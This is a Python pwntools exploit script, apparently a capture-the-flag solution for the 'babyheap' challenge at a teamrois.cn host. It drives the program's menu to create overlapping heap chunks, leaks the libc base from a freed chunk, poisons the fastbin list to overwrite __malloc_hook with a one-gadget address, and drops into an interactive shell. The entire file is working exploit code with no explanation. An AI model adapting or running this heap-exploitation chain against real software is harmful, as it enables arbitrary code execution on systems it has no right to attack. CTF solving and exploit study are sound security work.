from pwn import *

def alloc(size,content):
	r.sendline('1')
	r.recvuntil("size: ")
	r.sendline(str(size))
	r.recvuntil("content: ")
	r.send(content)
	r.recvuntil("choice: ")
def show(idx):
	r.sendline('2')
	r.recvuntil("index: ")
	r.sendline(str(idx))
	r.recvuntil("content: ")
	msg = r.recvuntil("\n")[:-1]
	r.recvuntil("choice: ")
	return u64(msg+"\x00\x00")
def delete(idx):
	r.sendline('3')
	r.recvuntil("index: ")
	r.sendline(str(idx))
	r.recvuntil("choice: ")
	
r = remote("babyheap.2018.teamrois.cn",3154)
#r = process("babyheap",env={"LD_PRELOAD":"./libc.so.6"})
#raw_input('?')
alloc(0x28,'A'*0x28)
alloc(0x100,'\x00'*0xf0+p64(0x100)+'\n')
alloc(0x100,'A'*0x100)
delete(0)
delete(1)
alloc(0x28,'A'*0x28)
alloc(0x80,'A'*0x80)
alloc(0x20,'A'*0x20)
delete(1)
delete(2)
alloc(0x80,'A'*0x80)
alloc(0x80,'A'*0x80)
alloc(0x80,'A'*0x80)
delete(2)
delete(4)
libc = show(3) - 0x3c4b78
__malloc_hook = libc + 0x3c4b10
onegadget = libc + 0x4526a
log.info("libc base: %#x",libc)
log.info("__malloc_hook: %#x",__malloc_hook)
log.info("onegadget: %#x",onegadget)
alloc(0x68,'A'*0x68)
alloc(0x68,'A'*0x68)
delete(2)
delete(4)
delete(3)
alloc(0x68,p64(__malloc_hook-0x23)+"\n")
alloc(0x68,p64(__malloc_hook)+"\n")
alloc(0x68,p64(__malloc_hook)+"\n")
alloc(0x68,'\x00'*0x13+p64(onegadget)+"\n")
r.sendline('1')
r.recvuntil("size: ")
r.sendline(str(10))
r.interactive()
